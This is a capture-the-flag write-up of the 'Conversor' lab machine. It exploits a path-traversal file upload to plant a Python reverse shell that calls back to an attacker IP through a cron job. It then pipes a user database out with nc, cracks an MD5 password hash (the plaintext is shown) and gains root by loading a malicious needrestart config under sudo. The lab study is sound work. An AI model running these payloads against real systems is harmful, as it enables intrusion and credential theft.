---
created: 2025-10-26
---

📅 `2025-10-26`

#web-app #business-logic #database #sudo #vulnerable-script

----

## 🖥️ Box Info

| ️🏷️ Name         |  `Conversor`   |
| --------------- | --- |
| 📆 Release Date |  `2025-10-24`   |
| 🌐 IP Address   |  `10.10.11.92`   |
| 🖥️ OS           |  `Linux`  |
| 🎯 Difficulty   |  `Easy`   |

----

## 🧠 Summary


**🧩 Key Concepts:** 

- Web app business logic error
- Database file (`sqlite3`)
- Vulnerable script executable with `sudo`

**🛠️ Tools:**  

- `Burp Suite`

**📚 Learned:**  

- On every target, identify the technologies in use (web server, frameworks, `OS`, etc.).

----

## 🌐 Port Scan

- **TCP**: 22, 80

---

## 🔍 Enumeration

This is the main site:

![[Pasted image 20251026222922.png]]

After creating an account and logging in, this is the main page. It's a tool for prettifying `nmap` scans by transforming their `XML` output with `XSLT`.

At first I thought it hinted at `XSLT` injection. I tried `XXE` and even command injection using `PHP`, but none of it worked.

Investigating the site I found that it was a `Flask` app, apparently running with `Apache`. The site had a page to download the source code of the app:

![[Pasted image 20251026223739.png]]

Inspecting the source code I found this important piece of information in the file `install.md`:

```
If you want to run Python scripts (for example, our server deletes all files older than 60 minutes to avoid system overload), you can add the following line to your /etc/crontab.

"""
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
"""
```

There's no way of knowing if this is actually in the target machine's `crontab` file, but if it is, I may be able to upload a `Python` file into the `scripts` directory with a reverse shell payload.

---

## 🪜 Foothold

Here is the important part of the app:

```python
<SNIP>
@app.route('/convert', methods=['POST'])
def convert():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    xml_file = request.files['xml_file']
    xslt_file = request.files['xslt_file']
    from lxml import etree
    xml_path = os.path.join(UPLOAD_FOLDER, xml_file.filename)
    xslt_path = os.path.join(UPLOAD_FOLDER, xslt_file.filename)
    xml_file.save(xml_path)
    xslt_file.save(xslt_path)
	try:
        parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False, load_dtd=False)
<SNIP>
```

These functions concatenate path strings to create a valid path, but do not filter on special characters, meaning I can create a file with `../` in the name and it will get interpreted as the parent directory.

The structure of the project is this:

```
.
├── app.py
├── app.wsgi
├── install.md
├── instance
│   └── users.db
├── scripts
├── static
│   ├── images
│   │   ├── arturo.png
│   │   ├── david.png
│   │   └── fismathack.png
│   ├── nmap.xslt
│   └── style.css
├── templates
│   ├── about.html
│   ├── base.html
│   ├── index.html
│   ├── login.html
│   ├── register.html
│   └── result.html
└── uploads
```

I decided to host an instance locally and try my theory. I uploaded a file, sent the request to Repeater, and changed the information of one of the files to this:

```
<SNIP>
------geckoformboundaryc80381dd223f0ae8259528dc73d1ed67
Content-Disposition: form-data; name="xml_file"; filename="../scripts/sh.py"
Content-Type: text/xml

import sys
import socket
import os
import pty

s=socket.socket()
s.connect(('10.10.15.55',443))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/bash")
<SNIP>
```

If I'm right, this will create a file named `sh.py` in `scripts`. This is the response:

```
HTTP/1.1 200 OK
Server: Werkzeug/3.1.3 Python/3.13.7
Date: Mon, 27 Oct 2025 03:27:24 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 75
Connection: close

Error: Start tag expected, '<' not found, line 1, column 1 (sh.py, line 1)
```

This doesn't matter, since according to the source code above, this error originates from a try/catch block, which is executed **after** saving the file.

Listing the `scripts` directory I found this:

```
$ ls scripts
sh.py
```

The file was written into the `scripts` directory. Let's do it on the real server.

First, start a listener:

```
nc -lvnp 443
```

Then I did the same against the target. After a few moments the `cronjob` ran and I got my reverse shell.

```
Ncat: Connection from 10.10.11.92:36008.
www-data@conversor:~$ ls
ls
conversor.htb
```

To confirm the `cronjob`:

```
www-data@conversor:~$ cat /etc/crontab
<SNIP>
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
```

It had the `cronjob` from the `install.md` file.

---

## 👤 User

Next, I went back to the web app's users database. The app hashes passwords with `MD5`, so they may be easy to crack. I used `cat <file> | nc <ip> <port>` and `nc -lvnp 8888 > database.db` to transfer the file. These are the contents of the users table:

![[Pasted image 20251026225312.png]]

`fismathack` is also a user on the server, so let's try to crack his password.

```
hashcat -m 0 '5b5c3ac3a1c897c94caad48e6c71fdec' $ROCKYOU -O

5b5c3ac3a1c897c94caad48e6c71fdec:Keepmesafeandwarm
```

The password cracked, so I tried it over `SSH`.

```
$ ssh fismathack@conversor.htb
fismathack@conversor.htb's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-160-generic x86_64)

fismathack@conversor:~$ ls         
user.txt
```

- `fismathack`:`Keepmesafeandwarm`

Got user.

---

## 🛡️ Privilege Escalation

Running `sudo -l` showed this:

```
fismathack@conversor:~$ sudo -l
<SNIP>
(ALL : ALL) NOPASSWD: /usr/sbin/needrestart
```

I looked into this file.

It's a `Perl` script, and executing it with the `-h` option showed me the available options:

```
fismathack@conversor:/tmp$ sudo /usr/sbin/needrestart -h
Unknown option: h
Usage:

  needrestart [-vn] [-c <cfg>] [-r <mode>] [-f <fe>] [-u <ui>] [-(b|p|o)] [-klw]

    -v		be more verbose
    -q		be quiet
    -m <mode>	set detail level
	e	(e)asy mode
	a	(a)dvanced mode
    -n		set default answer to 'no'
    -c <cfg>	config filename
    -r <mode>	set restart mode
	l	(l)ist only
	i	(i)nteractive restart
	a	(a)utomatically restart
    -b		enable batch mode
    -p          enable nagios plugin mode
    -o          enable OpenMetrics output mode, implies batch mode, cannot be used simultaneously with -p
    -f <fe>	override debconf frontend (DEBIAN_FRONTEND, debconf(7))
    -t <seconds> tolerate interpreter process start times within this value
    -u <ui>     use preferred UI package (-u ? shows available packages)

  By using the following options only the specified checks are performed:
    -k          check for obsolete kernel
    -l          check for obsolete libraries
    -w          check for obsolete CPU microcode

    --help      show this help
    --version   show version information
```

The script loads its configuration from `/etc/needrestart/needrestart.conf` by evaluating it as `Perl` code, so whatever is in the config file runs as root. The directory and the file are non-writable for my user, but the help menu shows option `-c`, which lets us pass our own config file. That's our way in.

I created a file called `/tmp/pwn.conf` with this command:

```
echo 'system("/bin/bash -p");' > /tmp/pwn.conf
```

And used it as the configuration file for `needrestart`:

```
fismathack@conversor:/tmp$ sudo /usr/sbin/needrestart -c /tmp/pwn.conf
root@conversor:/tmp# whoami
root
root@conversor:/tmp# cd
root@conversor:~# ls
root.txt  scripts
```

Rooted.
